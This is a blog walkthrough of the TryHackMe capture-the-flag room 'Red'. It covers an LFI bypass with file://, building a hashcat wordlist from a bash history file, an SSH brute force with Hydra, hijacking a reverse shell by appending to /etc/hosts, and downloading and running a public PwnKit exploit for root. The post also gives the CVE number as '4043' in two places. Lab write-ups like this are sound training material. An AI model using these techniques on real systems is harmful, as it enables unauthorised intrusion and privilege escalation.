---
title: "THM | Red | Easy"
date: 2023-07-16T21:13:03+01:00
draft: false
cover:
    image: "img/red/redisleet.png"
    # can also paste direct link from external site
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "Red vs Blue"
    caption: "Red vs Blue"
    #relative: false # To use relative path for cover image, used in hugo Page-bundles
tags: ["THM","Easy","Linux","LFI","Hashcat","CVE-2021-4034"]
categories: ["Web"]
weight: 2 
---

### This post is a walkthrough of the Try Hack Me room [Red](https://tryhackme.com/room/redisl33t){style="text-align: center;"}

---

## Intro{style="text-align: center;"}


Red is a TryHackMe room created by readysetexploit which was inspired by TryHackMe's King of the Hill. The theme of this machine is a battle between red and blue in which we try to navigate red's defense mechanisms in order to take back the machine. We start by finding a Web Server that is vulnerable to Local File Inclusion. We use to read blue's history file in order to create a password list. We gain access to the server and find that we can edit the hosts file so that a reverse shell that is being executed by red points to us. We then make use of the PwnKit exploit in order to get root and defeat red. Although it seems pretty straightforward, red's defenses add a layer of complexity that can irritate even the most seasoned player.

---


### NMAP SCAN

```sh
nmap 7.94 scan initiated Fri Jul 14 22:39:04 2023 as: nmap -sVC -T4 -vv -p- -oA nmap/all-tcp 10.10.245.169
Nmap scan report for redrocks.win (10.10.245.169)
Host is up, received reset ttl 63 (0.045s latency).
Scanned at 2023-07-14 22:39:04 IST for 18s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1MTQvnXh8VLRlrK8tXP9JEHtHpU13E7cBXa1XFM/TZrXXpffMfJneLQvTtSQcXRUSvq3Z3fHLk4xhM1BEDl+XhlRdt+bHIP4O5Myk8qLX9E1FFpcy3NrEHJhxCCY/SdqrK2ZXyoeld1Ww+uHpP5UBPUQQZNypxYWDNB5K0tbDRU+Hw+p3H3BecZwue1J2bITy6+Y9MdgJKKaVBQXHCpLTOv3A7uznCK6gLEnqHvGoejKgFXsWk8i5LJxJqsHtQ4b+AaLS9QAy3v9EbhSyxAp7Zgcz0t7GFRgc4A5LBFZL0lUc3s++AXVG0hJ9cdVTBl282N1/hF8PG4T6JjhOVX955sEBDER4T6FcCPehqzCrX0cEeKX6y6hZSKnT4ps9kaazx9O4slrraF83O9iooBTtvZ7iGwZKiCwYFOofaIMv+IPuAJJuRT0156NAl6/iSHyUM3vD3AHU8k7OISBkndyAlvYcN/ONGWn4+K/XKxkoXOCW1xk5+0sxdLfMYLk2Vt8=
|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDooZFwx0zdNTNOdTPWqi+z2978Kmd6db0XpL5WDGB9BwKvTYTpweK/dt9UvcprM5zMllXuSs67lPNS53h5jlIE=
|   256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDyWZoVknPK7ItXpqVlgsise5Vaz2N5hstWzoIZfoVDt
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 14 22:39:22 2023 -- 1 IP address (1 host up) scanned in 18.76 seconds
```

### Ports Of Interest

Port 22 (Open SSH),
Port 80 (Apache Server)

Starting with port 80, we just browse to the webpage `http://redrules.thm` to take a look for vulnerabilities or miss configurations.

![HomePage](/img/red/homepage.png "Homepage")

What's noticable about the webpage is that is rendering the page with a **page** parameter in the url,as seen from the screenshot above. From here I will use Burp Suite's Repeater funtionality to see if we can find a LFI vulnerbility here.

### Discovering LFI

![BurpSuite](/img/red/burp_repeater.png "Discovering LFI")

I initially tried a simple LFI attack `../../../../../etc/passwd` but this did not work, so I chose to use the `'file://` function. Other php functions such as PHP Filter would also work. Using the PHP File function I was able to bypass the sanitization that can be seen in the **index.php** file in Burp Suite below.

![sanitize](/img/red/sanitize.png "PHP Sanitization Code")

Using the the same PHP File function I was able to read `/etc/passwd` and found that there are two users of interest _(we could have guessed this by the room name and description)_, **Red** & **Blue**.  

### Bash History

Looking as the contents of `/home/blue/.bash_history` we see that the user Red used hashcat with the best64 ruleset to generate a more complex password list.  This list was using the password stored in the'.reminder' file.  To generate our password list we need to read the contents of the '.reminder' file, then we can generate our own passlist.txt locally. Copy the command `hashcat --stdout .reminder /usr/share/hashcat/rules/best64.rule > passlist.txt`. **You will need to modify the command to match your path to the hashcat rules if not the same as above!**

![Bash_History](/img/red/bash_history.png "Contents of Blue's .bash_history")

Screenshot snippet of our password list.  This will now be used to brute force our SSH login for the user Blue.

![PassList](/img/red/passlist.png "A Snippet of The 'passlist.txt")

### Brute Forcing SSH

Now we have a username Blue and our password list, we can proceed to brute-force our way into SSH.

![Hydra](/img/red/hydra_brute.png "Hydra Brute Forcing SSH")

From the screenshot above you can see Hydra was successfull in brute forcing the password.

### Foothold

Using the password found we can ssh into the box as the user Blue. We now have the first flag to submit to Try Hack Me, but also notice the user Red knows we are logged in and is taunting us, letting us know he will terminate or session and rest our password to defend his position on the box!

![Flag 1](/img/red/flag1.png "Flag 1 and Red Taunts")

To bypass this pty location awareness we can use the following with ssh `-T Disable pseudo-terminal allocation` _ref ssh man pages_.

### Manual Enumeration

Let's start with listing processes running on the box with the command `ps -auxw`.  There is a reverse shell running under the user Red that is pointing to 'redrules.thm' which is the hostname of the box we are on. Knowing that Red is using the DNS name for the host Red must have set permissions or attribute restrictions on the `/etc/hosts` file, so that he could change this.  Check the attributes of `/etc/hosts`. From the screenshots below you can see the attribute 'a' assigned to `/etc/hosts` which allows for opening the file for append only.

![Red Reverse Shell](/img/red/red_rev_shell.png " Red's Reverse Shell")

**Attribute Set**
![A Attribute Set](/img/red/a_attrib.png "The 'a' Attribute Is Set")

To check what attributes are set for the `/etc/hosts` file we can use lsattr `lsattr /etc/hosts`.
![Can't Write](/img/red/cantwrite2.png "Can't Write To File")

This 'a' attribute does allow us to append to the file, so we now need to append your own IP address for the hostname 'redrules.thm', as follows: `echo "<Your IP Address> redrules.thm" >> /etc/hosts` You must have your reverse listener running to catch this callback.

### Red Shell

**PWNCAT-CS Listener**

I like to use 'pwncat-cs' to catch my shells as it stabalizes the shell and gives us easy upload/downloads capabilites. See the screenshot below, once we have a shell as Red we can find **flag2**. From the screenshot below you can see the groups Red is a member of, and unfortunately Red is not a member of any high privilege groups. Submit flag2 to Try Hack Me and proceed to get root access.

![Red Shell](/img/red/red_shell.png " Red Shell With PWNCAT-CS")

**Privilege Escalation** 🎯

I always use `ls -las` to list the contents of a folder so I can see the hidden items and their permissions, doing this in Red's home folder reveals a '.git' folder which is not very common for a home folder.  Change directory into this folder and run `ls -las` again to see the contents.  The is a binary file called pkexec, which I recognise from a CVE discoverd in 2021 and which was give the name 'CVE-2021-4043'. There are plenty of exploits available online for this particiular vulnerability. If you are interested in reading more about the exploit you can find a good article online [here](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034).

I downloaded the python3 exploit from [here](https://raw.githubusercontent.com/Almorabea/pkexec-exploit/main/CVE-2021-4034.py) with the command `wget https://raw.githubusercontent.com/Almorabea/pkexec-exploit/main/CVE-2021-4034.py` and uploaded this to the box with pwncat's upload funtionality. You will need to edit the python script before uploading it because the 'pkexec' file is not in `/usr/bin` and this is where the script looks for it.

**Edited Python Script**
![Modify Python Script](/img/red/edit_exploit.png "Edit Before Upload")

**Upload Exploit**
![Upload Exploit](/img/red/exploit_upload.png "Upload Our Exploit")

Simply run the exploit with `python3 CVE-2021-4043.py` to get root access and grab the final flag3. Submit your last flag to complete the room. ☠️

![Run Exploit](/img/red/exploit.png "Run Exploit For root")

---

### Final Thoughts.{style="text-align: center;"}

The Red challenge on TryHackMe, designed by readysetexploit, was an enjoyable and thrilling experience, reminiscent of the Blue vs Red theme. Inspired by TryHackMe's King of the Hill, the challenge revolved around a fierce battle between the two teams, where we had to navigate Red's formidable defense mechanisms to regain control of the machine. Starting by identifying a vulnerable Web Server with Local File Inclusion, we cleverly accessed Blue's history file to craft a powerful password list. As we gained entry to the server, we discovered the ability to manipulate the hosts file, redirecting a reverse shell executed by Red back to us. Our strategy culminated with the strategic use of the PwnKit exploit, eventually leading to victory over Red. Though the path appeared straightforward, Red's cunning defenses added a layer of complexity that kept us on our toes, challenging even the most seasoned player. The theme's dynamics, where two teams clashed in a battle of wits, made the challenge incredibly fun and memorable.

---



